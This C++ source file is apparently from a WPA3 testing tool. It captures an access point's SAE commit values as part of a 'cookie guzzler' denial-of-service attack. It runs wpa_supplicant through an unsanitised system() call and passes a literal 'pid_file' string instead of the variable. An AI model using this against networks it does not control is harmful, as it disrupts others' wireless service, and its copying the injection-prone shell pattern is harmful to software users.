#include <fstream>
#include <unistd.h>
#include <csignal>
#include <libtins-src/include/tins/sniffer.h>
#include <tins/hw_address.h>

#include "attacks/DoS_hard/cookie_guzzler/cookie_guzzler.h"
#include "logger/log.h"

namespace Tins{
    class RawPDU;
    class Dot11Authentication;
}

using namespace std;
using namespace Tins;
namespace wpa3_tester::cookie_guzzler{

    SAEPair capture_sae_commit(const string &iface, const HWAddress<6> &ap_mac, const int timeout_sec) {
        Sniffer sniffer(iface);
        sniffer.set_filter("wlan type mgt subtype auth and wlan addr2 " + ap_mac.to_string());

        SAEPair result;

        auto callback = [&result](PDU &pdu) {
            const auto &auth = pdu.rfind_pdu<Dot11Authentication>();

            if (auth.auth_algorithm() == 3 && auth.auth_seq_number() == 1) {
                if (pdu.find_pdu<RawPDU>()) {
                    const auto &payload = pdu.rfind_pdu<RawPDU>().payload();

                    if (payload.size() >= (2 + 32 + 64)) {
                        result.scalar.assign(payload.begin() + 2, payload.begin() + 34);
                        result.element.assign(payload.begin() + 34, payload.begin() + 98);
                        result.success = true;
                        return false;
                    }
                }
            }
            return true;
        };


        atomic running{true};
        thread timer([&]() {this_thread::sleep_for(seconds(timeout_sec)); running = false;});
        sniffer.sniff_loop([&](PDU& pdu) { callback(pdu); return running.load();});
        timer.join();

        return result;
    }

    // run_cmd for logging or useless:
    void start_wpa_supplicant(const string &iface, const string &conf_path, const string &pid_file) {
        // -B (background) -P <pid file>
        const string cmd = "wpa_supplicant -B -i " + iface + " -c " + conf_path + " -P " + pid_file;
        log(LogLevel::INFO, "Run wpa_supplicant to get handshake values...");
        system(cmd.c_str());
    }

    void stop_wpa_supplicant(const string &pid_file){
        ifstream file(pid_file);
        if (file.is_open()) {
            pid_t pid;
            file >> pid;
            if (pid > 0) {
                log(LogLevel::INFO, "Stop wpa_supplicant (PID: " + to_string(pid) + ")");
                kill(pid, SIGTERM);
            }
            file.close();
            remove(pid_file.c_str());
        }
    }

    std::string create_wpa_supplicant_config(const std::string& ssid) {
        std::string conf_path = "/tmp/wpa3_guzzler_temp.conf";
        std::ofstream conf(conf_path);

        if (conf.is_open()) {
            conf << "ctrl_interface=/var/run/wpa_supplicant\n";
            conf << "update_config=1\n";
            conf << "network={\n";
            conf << "    ssid=\"" << ssid << "\"\n";
            conf << "    key_mgmt=SAE\n";
            conf << "    sae_password=\"anything123\"\n"; // Heslo je jedno, chceme jen Commit
            conf << "    ieee80211w=2\n";                // Nutné pro WPA3 (PMF)
            conf << "}\n";
            conf.close();
        }

        return conf_path;
    }


    SAEPair get_commit_values(const string &sniff_iface, const string &ssid, const HWAddress<6> &ap_mac, const int timeout) {
        const string pid_file = "/tmp/wpa_supplicant_get_commit_values.pid";
        string conf_path = create_wpa_supplicant_config(ssid);
        start_wpa_supplicant(sniff_iface, filesystem::absolute(conf_path), pid_file);
        SAEPair sae_params = capture_sae_commit(sniff_iface, ap_mac, timeout);
        stop_wpa_supplicant("pid_file");
        std::filesystem::remove(conf_path);
        return sae_params;
    }
}
